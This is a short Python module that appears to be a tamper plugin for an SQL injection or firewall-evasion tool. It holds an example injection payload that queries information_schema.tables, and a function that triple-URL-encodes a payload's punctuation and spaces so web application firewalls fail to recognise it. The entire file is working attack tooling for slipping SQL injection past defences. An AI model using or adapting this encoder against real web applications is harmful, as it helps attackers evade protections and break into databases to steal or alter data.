import string
try:
    from urllib import quote_plus
except ImportError:
    from urllib.parse import quote_plus


__example_payload__ = "' AND 1=1;SELECT * FROM information_schema.tables '"
__type__ = "triple URL encoding the payload characters"


def tamper(payload, **kwargs):
    danger_chars = string.punctuation + " "
    extra_danger_chars = ("_", ".")
    retval = ""
    for char in list(payload):
        if char not in danger_chars:
            retval += char
        elif char == extra_danger_chars[0]:
            retval += quote_plus("%255F")
        elif char == extra_danger_chars[1]:
            retval += quote_plus("%252E")
        else:
            retval += quote_plus(quote_plus(quote_plus(char)))
    return retval